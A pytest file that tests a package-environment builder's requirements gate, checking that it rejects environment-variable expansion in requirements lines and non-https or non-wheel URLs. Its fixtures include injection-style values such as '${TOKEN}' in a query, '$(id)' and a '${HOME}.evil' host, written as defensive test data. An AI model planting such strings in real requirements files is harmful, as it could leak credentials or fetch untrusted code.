"""V0.7 G6 tester r3 (T-15 / https-only): the requirements gate, attacked from
the contract: a job's requirements file must not make the node expand its
environment (``$VAR`` / ``${VAR}``) and a wheel URL is lower-case ``https://``.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from meshforge.agent.envs.builder import EnvBuilder, EnvsConfig
from meshforge.agent.envs.errors import EnvError
from meshforge.agent.envs.hash import normalize_requirements

pytestmark = pytest.mark.unit

H = "a" * 64
WHEEL = "https://files.example/pkg-1-py3-none-any.whl"

REFUSED_ALWAYS = {
    "braces": "pkg @ https://${HOST}/p-1-py3-none-any.whl\n",
    "bare": "pkg @ https://$HOST/p-1-py3-none-any.whl\n",
    "bare-underscore": "pkg @ https://$_X/p-1-py3-none-any.whl\n",
    "braces-lower": "pkg @ https://${home}/p.whl\n",
    "braces-digit-first": "pkg @ https://${1}/p.whl\n",
    "braces-empty": "pkg @ https://${}/p.whl\n",
    "braces-default": "pkg @ https://${HOME:-x}/p.whl\n",
    "in-hash": f"x==1 --hash=sha256:${{HOME}}{H}\n",
    "in-hash-bare": f"x==1 --hash=sha256:$HOME{H}\n",
    "in-marker": "x==1; python_version > '3' and platform_node == '${HOSTNAME}'\n",
    "in-extras": "x[$EXTRA]==1\n",
    "in-version": "x==$V\n",
    "in-name": "${PKG}==1\n",
    "in-fragment": f"pkg @ {WHEEL}#sha256=$HOME\n",
    "in-query": f"pkg @ {WHEEL}?token=${{TOKEN}}\n",
    "userinfo": "pkg @ https://${USER}:${PASS}@files.example/p-1-py3-none-any.whl\n",
    "after-comment-like-hash": "x==1#$HOME\n",  # no space: not a comment
    "continuation-joins": "x @ https://h/$\\\nHOME/p.whl\n",
    "continuation-joins-brace": "x @ https://h/$\\\n{HOME}/p.whl\n",
    "two-dollars-then-var": "x @ https://h/$$HOME/p.whl\n",
    "escaped-then-var": "x @ https://h/\\$HOME/p.whl\n",
    "dollar-brace-in-space-sep": "x==1 --hash ${H}\n",
}

# `$` that names nothing, other shell syntaxes the installers do not expand:
PASSES_THE_ENV_RULE = {
    "dollar-paren": "x==1; platform_node == '$(id)'\n",
    "percent-var": "x==1; platform_node == '%HOME%'\n",
    "dollar-dollar": "x==1; platform_node == '$$'\n",
    "dollar-digit": "x==1; platform_node == '$1'\n",
    "dollar-space": "x==1; platform_node == '$ '\n",
    "dollar-end": "x==1; platform_node == 'a$'\n",
    "comment-only": "x==1 # use ${HOME} here\n",
    "comment-line": "# $HOME\nx==1\n",
}


@pytest.mark.parametrize("wheels_only", [True, False])
@pytest.mark.parametrize("name", sorted(REFUSED_ALWAYS))
def test_an_environment_reference_is_refused_whatever_the_mode(
    name: str, wheels_only: bool
) -> None:
    with pytest.raises(EnvError) as exc:
        normalize_requirements(REFUSED_ALWAYS[name].encode(), wheels_only=wheels_only)
    assert exc.value.reason == "requirements_rejected", (name, exc.value)


@pytest.mark.parametrize("wheels_only", [True, False])
@pytest.mark.parametrize("name", sorted(PASSES_THE_ENV_RULE))
def test_syntax_the_installers_do_not_expand_is_not_refused_by_the_env_rule(
    name: str, wheels_only: bool
) -> None:
    out = normalize_requirements(
        PASSES_THE_ENV_RULE[name].encode(), wheels_only=wheels_only
    )
    # whatever is kept never contains a reference the installer would expand
    assert b"${" not in out
    assert b"$HOME" not in out


@pytest.mark.parametrize("wheels_only", [True, False])
def test_what_is_handed_to_the_installer_has_no_dollar_name(wheels_only: bool) -> None:
    text = "x==1 # ${HOME}\n# $PATH\ny==2; platform_node == '$$'\n"
    out = normalize_requirements(text.encode(), wheels_only=wheels_only).decode()
    assert "HOME" not in out and "PATH" not in out


@pytest.mark.parametrize("only_binary", [True, False])
def test_the_builders_file_reader_is_the_same_door(
    tmp_path: Path, only_binary: bool
) -> None:
    builder = EnvBuilder(
        EnvsConfig(
            root=tmp_path / "e", free_disk_floor_bytes=0, only_binary=only_binary
        )
    )
    work = tmp_path / "w"
    work.mkdir()
    (work / "r.txt").write_text("pkg @ https://${HOME}.evil/x-1-py3-none-any.whl\n")
    with pytest.raises(EnvError) as exc:
        builder.read_requirements(work, "r.txt")
    assert exc.value.reason == "requirements_rejected"
    assert "line 1" in str(exc.value)
    (work / "ok.txt").write_text("x==1\n")
    assert builder.read_requirements(work, "ok.txt") == b"x==1\n"


# ----------------------------------------------------------------- https only

WHEELS_ONLY_REFUSED = {
    "http": "pkg @ http://files.example/p-1-py3-none-any.whl\n",
    "HTTP": "pkg @ HTTP://files.example/p-1-py3-none-any.whl\n",
    "HTTPS": "pkg @ HTTPS://files.example/p-1-py3-none-any.whl\n",
    "hTTps": "pkg @ hTTps://files.example/p-1-py3-none-any.whl\n",
    "Https": "pkg @ Https://files.example/p-1-py3-none-any.whl\n",
    "http-glued": "pkg@http://files.example/p-1-py3-none-any.whl\n",
    "HTTPS-glued": "pkg@HTTPS://files.example/p-1-py3-none-any.whl\n",
    "bare-http-wheel": "http://files.example/p-1-py3-none-any.whl\n",
    "bare-HTTPS-wheel": "HTTPS://files.example/p-1-py3-none-any.whl\n",
    "http-userinfo": "pkg @ http://u:p@files.example/p-1-py3-none-any.whl\n",
    "https-sdist-at-http": "pkg @ https://h/x.whl@http://evil/a.tar.gz\n",
    "ftp": "pkg @ ftp://h/p-1-py3-none-any.whl\n",
    "git": "pkg @ git+https://h/p.git\n",
    "https-not-whl": "pkg @ https://h/p-1.tar.gz\n",
    "https-whl-in-query-only": "pkg @ https://h/p.tar.gz?x=a.whl\n",
    "schemeless": "pkg @ //h/p-1-py3-none-any.whl\n",
    "hash-then-http": f"pkg @ http://h/p.whl --hash=sha256:{H}\n",
}

WHEELS_ONLY_ACCEPTED = {
    "https": f"pkg @ {WHEEL}\n",
    "https-hash": f"pkg @ {WHEEL} --hash=sha256:{H}\n",
    "https-glued": f"pkg@{WHEEL}\n",
    "https-userinfo": "pkg @ https://u:p@files.example/p-1-py3-none-any.whl\n",
    "https-port": "pkg @ https://files.example:8443/p-1-py3-none-any.whl\n",
    "https-ip": "pkg @ https://127.0.0.1:9/p-1-py3-none-any.whl\n",
}


@pytest.mark.parametrize("name", sorted(WHEELS_ONLY_REFUSED))
def test_wheels_only_refuses_everything_but_a_lower_case_https_wheel(name: str) -> None:
    with pytest.raises(EnvError) as exc:
        normalize_requirements(WHEELS_ONLY_REFUSED[name].encode(), wheels_only=True)
    assert exc.value.reason == "requirements_rejected"
    assert "line 1" in str(exc.value)


@pytest.mark.parametrize("name", sorted(WHEELS_ONLY_ACCEPTED))
def test_wheels_only_accepts_an_https_wheel(name: str) -> None:
    assert normalize_requirements(WHEELS_ONLY_ACCEPTED[name].encode(), wheels_only=True)
